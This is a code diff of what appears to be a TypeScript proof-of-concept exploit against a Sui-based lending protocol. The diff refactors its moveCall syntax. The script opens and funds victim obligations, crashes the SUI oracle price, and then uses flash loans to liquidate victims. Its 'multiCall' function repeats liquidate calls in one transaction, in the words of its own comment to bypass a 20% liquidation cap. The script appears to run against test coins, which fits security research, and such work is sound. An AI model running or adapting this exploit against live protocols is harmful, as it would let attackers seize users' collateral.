@@ -71,14 +71,14 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
     // 2. Open Obligation
     const openTx = new SuiTxBlock();
     openTx.setSender(victimAddr);
-    const [obligation, obligationKey, hotPotato] = openTx.moveCall({
-        target: `${PKG}::open_obligation::open_obligation`,
-        arguments: [openTx.object(VERSION)],
-    });
-    openTx.moveCall({
-        target: `${PKG}::open_obligation::return_obligation`,
-        arguments: [openTx.object(VERSION), obligation, hotPotato],
-    });
+    const [obligation, obligationKey, hotPotato] = openTx.moveCall(
+        `${PKG}::open_obligation::open_obligation`,
+        [openTx.object(VERSION)]
+    );
+    openTx.moveCall(
+        `${PKG}::open_obligation::return_obligation`,
+        [openTx.object(VERSION), obligation, hotPotato]
+    );
     openTx.transferObjects([obligationKey], openTx.pure.address(victimAddr));
     
     const openResult = await suiKit.signAndSendTxn(openTx, { signer: victimKeypair });
@@ -93,71 +93,76 @@ async function setupVictim(victimKeypair: Ed25519Keypair, label: string) {
     const suiCoinId = await getCoinObjectId(victimAddr, SUI_TYPE);
     const depositTx = new SuiTxBlock();
     depositTx.setSender(victimAddr);
-    depositTx.moveCall({
-        target: `${PKG}::deposit_collateral::deposit_collateral`,
-        typeArguments: [SUI_TYPE],
-        arguments: [
-            depositTx.object(VERSION), depositTx.object(obligationId), 
-            depositTx.object(MARKET), depositTx.object(suiCoinId)
-        ],
-    });
+    depositTx.moveCall(
+        `${PKG}::deposit_collateral::deposit_collateral`,
+        [depositTx.object(VERSION), depositTx.object(obligationId), depositTx.object(MARKET), depositTx.object(suiCoinId)],
+        [SUI_TYPE]
+    );
     await suiKit.signAndSendTxn(depositTx, { signer: victimKeypair });
 
     // 4. Mint & Supply USDC & ETH ke Market
     const supplyTx = new SuiTxBlock();
     supplyTx.setSender(suiKit.currentAddress);
     
-    const [usdcCoin] = supplyTx.moveCall({
-        target: `${TEST_COIN_PKG}::usdc::mint`,
-        arguments: [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)]
-    });
-    const [sUSDC] = supplyTx.moveCall({
-        target: `${PKG}::mint::mint`,
-        typeArguments: [USDC_TYPE],
-        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)]
-    });
-    supplyTx.moveCall({ target: `0x2::coin::destroy_zero`, typeArguments: [`${PKG}::reserve::MarketCoin<${USDC_TYPE}>`], arguments: [sUSDC] });
+    const [usdcCoin] = supplyTx.moveCall(
+        `${TEST_COIN_PKG}::usdc::mint`,
+        [supplyTx.object(USDC_TREASURY), supplyTx.pure.u64(100_000_000_000_000n)]
+    );
+    const [sUSDC] = supplyTx.moveCall(
+        `${PKG}::mint::mint`,
+        [supplyTx.object(VERSION), supplyTx.object(MARKET), usdcCoin, supplyTx.object(CLOCK)],
+        [USDC_TYPE]
+    );
+    supplyTx.moveCall(
+        `0x2::coin::destroy_zero`,
+        [sUSDC],
+        [`${PKG}::reserve::MarketCoin<${USDC_TYPE}>`]
+    );
 
-    const [ethCoin] = supplyTx.moveCall({
-        target: `${TEST_COIN_PKG}::eth::mint`,
-        arguments: [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)]
-    });
-    const [sETH] = supplyTx.moveCall({
-        target: `${PKG}::mint::mint`,
-        typeArguments: [ETH_TYPE],
-        arguments: [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)]
-    });
-    supplyTx.moveCall({ target: `0x2::coin::destroy_zero`, typeArguments: [`${PKG}::reserve::MarketCoin<${ETH_TYPE}>`], arguments: [sETH] });
+    const [ethCoin] = supplyTx.moveCall(
+        `${TEST_COIN_PKG}::eth::mint`,
+        [supplyTx.object(ETH_TREASURY), supplyTx.pure.u64(10_000_000_000n)]
+    );
+    const [sETH] = supplyTx.moveCall(
+        `${PKG}::mint::mint`,
+        [supplyTx.object(VERSION), supplyTx.object(MARKET), ethCoin, supplyTx.object(CLOCK)],
+        [ETH_TYPE]
+    );
+    supplyTx.moveCall(
+        `0x2::coin::destroy_zero`,
+        [sETH],
+        [`${PKG}::reserve::MarketCoin<${ETH_TYPE}>`]
+    );
 
     await suiKit.signAndSendTxn(supplyTx);
 
     // 5. Borrow USDC
     const borrowUSDCTx = new SuiTxBlock();
     borrowUSDCTx.setSender(victimAddr);
-    const [borrowedUSDC] = borrowUSDCTx.moveCall({
-        target: `${PKG}::borrow::borrow`,
-        typeArguments: [USDC_TYPE],
-        arguments: [
+    const [borrowedUSDC] = borrowUSDCTx.moveCall(
+        `${PKG}::borrow::borrow`,
+        [
             borrowUSDCTx.object(VERSION), borrowUSDCTx.object(obligationId), borrowUSDCTx.object(obligationKeyId),
             borrowUSDCTx.object(MARKET), borrowUSDCTx.object(REGISTRY), borrowUSDCTx.pure.u64(5_000_000_000n),
             borrowUSDCTx.object(ORACLE), borrowUSDCTx.object(CLOCK)
         ],
-    });
+        [USDC_TYPE]
+    );
     borrowUSDCTx.transferObjects([borrowedUSDC], borrowUSDCTx.pure.address(victimAddr));
     await suiKit.signAndSendTxn(borrowUSDCTx, { signer: victimKeypair });
 
     // 6. Borrow ETH
     const borrowETHTx = new SuiTxBlock();
     borrowETHTx.setSender(victimAddr);
-    const [borrowedETH] = borrowETHTx.moveCall({
-        target: `${PKG}::borrow::borrow`,
-        typeArguments: [ETH_TYPE],
-        arguments: [
+    const [borrowedETH] = borrowETHTx.moveCall(
+        `${PKG}::borrow::borrow`,
+        [
             borrowETHTx.object(VERSION), borrowETHTx.object(obligationId), borrowETHTx.object(obligationKeyId),
             borrowETHTx.object(MARKET), borrowETHTx.object(REGISTRY), borrowETHTx.pure.u64(2_000_000_000n),
             borrowETHTx.object(ORACLE), borrowETHTx.object(CLOCK)
         ],
-    });
+        [ETH_TYPE]
+    );
     borrowETHTx.transferObjects([borrowedETH], borrowETHTx.pure.address(victimAddr));
     await suiKit.signAndSendTxn(borrowETHTx, { signer: victimKeypair });
 
@@ -172,11 +177,11 @@ async function crashOraclePrice() {
     const tx = new SuiTxBlock();
     tx.setSender(suiKit.currentAddress);
     
-    tx.moveCall({
-        target: `${PKG}::x_oracle::update_price`,
-        typeArguments: [SUI_TYPE],
-        arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000)]
-    });
+    tx.moveCall(
+        `${PKG}::x_oracle::update_price`,
+        [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000)],
+        [SUI_TYPE]
+    );
     
     await suiKit.signAndSendTxn(tx);
     console.log("[TRIGGER] SUI price crashed. Victims are now UNHEALTHY!");
@@ -195,15 +200,21 @@ async function beforeExploit_singleCall(victimObligationId: string) {
     const tx = new SuiTxBlock();
     tx.setSender(suiKit.currentAddress);
     
-    const [flashUSDC, flashReceipt] = tx.moveCall({
-        target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE],
-        arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
-    });
-    const [remainUSDC, collateralCoin] = tx.moveCall({
-        target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE],
-        arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), flashUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
-    });
-    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt] });
+    const [flashUSDC, flashReceipt] = tx.moveCall(
+        `${PKG}::flash_loan::borrow_flash_loan`,
+        [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
+        [USDC_TYPE]
+    );
+    const [remainUSDC, collateralCoin] = tx.moveCall(
+        `${PKG}::liquidate::liquidate`,
+        [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), flashUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
+        [USDC_TYPE, SUI_TYPE]
+    );
+    tx.moveCall(
+        `${PKG}::flash_loan::repay_flash_loan`,
+        [tx.object(VERSION), tx.object(MARKET), remainUSDC, flashReceipt],
+        [USDC_TYPE]
+    );
     tx.transferObjects([collateralCoin], tx.pure.address(suiKit.currentAddress));
     
     await suiKit.signAndSendTxn(tx);
@@ -224,16 +235,40 @@ async function afterExploit_multiCall(victimObligationId: string) {
     const tx = new SuiTxBlock();
     tx.setSender(suiKit.currentAddress);
     
-    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)] });
-    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)] });
+    const [f_USDC, r_USDC] = tx.moveCall(
+        `${PKG}::flash_loan::borrow_flash_loan`,
+        [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)],
+        [USDC_TYPE]
+    );
+    const [f_ETH, r_ETH] = tx.moveCall(
+        `${PKG}::flash_loan::borrow_flash_loan`,
+        [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)],
+        [ETH_TYPE]
+    );
     
     // EXPLOIT: Call 1 (USDC Debt)
-    const [rem1, c1] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_USDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
+    const [rem1, c1] = tx.moveCall(
+        `${PKG}::liquidate::liquidate`,
+        [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_USDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
+        [USDC_TYPE, SUI_TYPE]
+    );
     // EXPLOIT: Call 2 (ETH Debt) - Bypasses 20% cap
-    const [rem2, c2] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [ETH_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_ETH, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
+    const [rem2, c2] = tx.moveCall(
+        `${PKG}::liquidate::liquidate`,
+        [tx.object(VERSION), tx.object(victimObligationId), tx.object(MARKET), f_ETH, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)],
+        [ETH_TYPE, SUI_TYPE]
+    );
     
-    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC] });
-    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH] });
+    tx.moveCall(
+        `${PKG}::flash_loan::repay_flash_loan`,
+        [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC],
+        [USDC_TYPE]
+    );
+    tx.moveCall(
+        `${PKG}::flash_loan::repay_flash_loan`,
+        [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH],
+        [ETH_TYPE]
+    );
     
     tx.mergeCoins(c1, [c2]);
     tx.transferObjects([c1], tx.pure.address(suiKit.currentAddress));
